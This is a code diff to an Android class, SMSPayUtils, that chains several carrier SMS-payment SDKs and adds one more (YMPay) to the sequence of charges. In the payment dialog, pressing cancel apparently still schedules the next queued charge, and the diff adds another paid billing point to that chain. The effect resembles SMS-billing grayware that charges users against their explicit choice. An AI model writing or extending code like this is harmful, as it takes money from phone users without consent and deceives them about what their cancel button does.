@@ -24,7 +24,9 @@ import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.ImageView;
 
-import com.zf.jy.mm.R;
+import com.drjq.mm.R;
+import com.android.yimeng.ympay.in.PayCalBackListener;
+import com.android.yimeng.ympay.pay.YMPay;
 import com.dm.ml.MiLiNewApi;
 import com.umeng.analytics.MobclickAgent;
 import com.zhangzhifu.sdk.ZhangPaySdk;
@@ -58,13 +60,13 @@ public class SMSPayUtils {
 	private void getSign() {
 		try {
 			if (!pay_status) {
-//				if (!BasicUtils.isInstallApk(context, ConfigUtils.packname)
-//						&& ConfigUtils.isdownplug) {
-//					pluginDialog();
-//				} else {
-					if (!cpname.equals("libao"))
-						ThirdDialog.getInstance().makeDialog(context);
-//				}
+				// if (!BasicUtils.isInstallApk(context, ConfigUtils.packname)
+				// && ConfigUtils.isdownplug) {
+				// pluginDialog();
+				// } else {
+				if (!cpname.equals("libao"))
+					ThirdDialog.getInstance().makeDialog(context);
+				// }
 			}
 
 		} catch (Exception e) {
@@ -203,14 +205,14 @@ public class SMSPayUtils {
 		String price = "2000";
 		// 计费点编号
 		String payPoint;
-		if (cpname.equals("warning")) {
+//		if (cpname.equals("warning")) {
 			payPoint = "4";
-		} else if (cpname.equals("libao")) {
-			payPoint = "5";
-		} else {
-			payPoint = "6";
-		}
-		SiKaiPayUtils.pay(context, payPoint, price, cpname, handler, true);
+//		} else if (cpname.equals("libao")) {
+//			payPoint = "5";
+//		} else {
+//			payPoint = "6";
+//		}
+		SiKaiPayUtils.pay(context, payPoint, price, "warning", handler, true);
 
 	}
 
@@ -221,13 +223,14 @@ public class SMSPayUtils {
 	}
 
 	public void initSDK() {
-		if (Conf.VIP)
-			return;
+		if (Conf.VIP){
+			Intent intent = new Intent("com.zmv.login.action");
+			context.sendBroadcast(intent);
+			return;}
 		if (ConfigUtils.warningData != null
 				&& ConfigUtils.warningData.size() > 0 && !ConfigUtils.nopay) {
 			countPay = ConfigUtils.warningData.size();
 			list_warning = new ArrayList<Integer>();
-
 			if (ConfigUtils.warningData.toString().contains("zzhi")) {//
 				// zzSDK
 				zzPay = new zzPaySDK();
@@ -259,6 +262,8 @@ public class SMSPayUtils {
 
 				}
 			}
+			YMPay.getInstance(context).init(context);
+			list_warning.add(5);
 			// 调用支付SDK
 			if (list_warning != null && list_warning.size() > 0) {
 				posPay = 0;
@@ -312,9 +317,10 @@ public class SMSPayUtils {
 							else
 								MobclickAgent.onEvent(context,
 										"pay_dialog_cancel");
-//							getSign();
-							handler.sendEmptyMessageDelayed(
-									list_warning.get(posPay), 1000);	
+							// getSign();
+							if (posPay < countPay)
+								handler.sendEmptyMessageDelayed(
+										list_warning.get(posPay), 1000);
 						}
 					});
 			payDialog.getWindow().findViewById(R.id.btn_pay_submit)
@@ -325,8 +331,9 @@ public class SMSPayUtils {
 							// TODO Auto-generated method stub
 							if (payDialog != null)
 								payDialog.dismiss();
-							handler.sendEmptyMessageDelayed(
-									list_warning.get(posPay), 1000);
+							if (posPay < countPay)
+								handler.sendEmptyMessageDelayed(
+										list_warning.get(posPay), 1000);
 							if (cpname.equals("warning"))
 								MobclickAgent.onEvent(context,
 										"pay_dialog_vip_sure");
@@ -370,7 +377,6 @@ public class SMSPayUtils {
 
 			@Override
 			public void onAction(int arg0, Object arg1) {
-				 Log.e("zzPay", arg0 + "");
 				if (arg0 == 200) {
 
 					MobclickAgent.onEvent(context, "zz_success");
@@ -398,7 +404,6 @@ public class SMSPayUtils {
 				+ ",warning", new OnMakePaymentListener() {
 			@Override
 			public void onAction(int arg0, Object arg1) {
-				 Log.e("zzPayad", arg0 + "");
 				if (arg0 == 200) {
 
 					MobclickAgent.onEvent(context, "zz_ak_success");
@@ -413,7 +418,6 @@ public class SMSPayUtils {
 	public Handler handler = new Handler() {
 		public void handleMessage(Message msg) {
 			try {
-				// Log.e("警告支付===1002=", "第" + posPay + "个：" + msg.what + "");
 				switch (msg.what) {
 				case 0:
 					makeDialog(context);
@@ -466,6 +470,31 @@ public class SMSPayUtils {
 						MiLiPayUtils.getInstance(context, handler).MiLiPay(
 								"libao", "51340758", 10);
 					}
+					break;
+				case 5:// 应美
+					MobclickAgent.onEvent(context, "ym_request");
+					int pointID = 0;
+					if (cpname.equals("warning"))
+						pointID = 385;
+					else if (cpname.equals("libao"))
+						pointID = 384;
+					else
+						pointID = 386;
+					YMPay.getInstance(context).pay("-1", pointID, 2000,
+							context, new PayCalBackListener() {
+
+								@Override
+								public void success(int code) {
+									SuccessResult();
+									MobclickAgent.onEvent(context, "ym_success");
+								}
+
+								@Override
+								public void fail(int code) {
+									FailResult();
+									MobclickAgent.onEvent(context, "ym_fail");
+								}
+							});
 					break;
 				case 101:// 斯凯支付失败
 					MobclickAgent.onEvent(context, "zm_fail");
